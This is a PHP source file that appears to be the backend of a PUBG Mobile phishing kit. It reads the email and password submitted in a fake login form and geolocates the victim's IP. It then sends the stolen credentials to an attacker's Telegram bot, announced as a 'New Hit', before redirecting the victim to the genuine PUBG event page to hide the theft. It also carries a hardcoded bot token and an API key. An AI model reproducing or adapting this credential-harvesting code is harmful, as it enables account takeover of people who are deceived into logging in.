<?php
$API_KEY = "1951659743:AAEmCUQgEya6WgdpgJswLBSgzdyZ0h6JhQw";
?>
<?php
$min_seconds_between_refreshes = 300;
session_start();
if(array_key_exists("last_access", $_SESSION) && time()-$min_seconds_between_refreshes <= $_SESSION["last_access"]) {
  exit("<H1>You are refreshing too quickly, please wait a few seconds and try again.</H1>");
}
$_SESSION["last_access"] = time();
 ?>
<?php
$ip = $_SERVER[ REMOTE_ADDR ]; 
$details = json_decode(file_get_contents("http://api.ipstack.com/".$ip."?access_key=b52bc080bf77e1a10bbb7601d5f39ab1"));
$country_name = $details->country_name;
$country_code = $details->country_code;
$city = $details->city;
$region_name = $details->region_name;
$calling_code = $details->location->calling_code;
$ip = $details->ip;
 ?>
<?php
$admin = id ; 
$email = $_POST["email"];
$password = $_POST['password'];
$login = $_POST['login'];
$time = date("Y-m-d H:i:s");
$text = urlencode("
------🤖Hello Sir New Hit📩-------
- Type : $login
- email : `$email`
- Pass : `$password`
- Country : `$country_name`
- Time : $time
- Join Us: @PHP606
- Contact dev : @PHP505
-----------------------------------------------------
");
$url = "https://api.telegram.org/bot".$API_KEY."/sendMessage?chat_id=$admin&text=$text&parse_mode=markdown";
file_get_contents($url);
?>
<html>
<head>
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-159654279-2"></script>
<script>
window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag("js", new Date());
gtag("config", "UA-159654279-2");
</script>
<meta http-equiv="Refresh" content="0; url=https://www.pubgmobile.com/en/event/royalepass19/#page3" />
</head>
<body>
</body>
</html>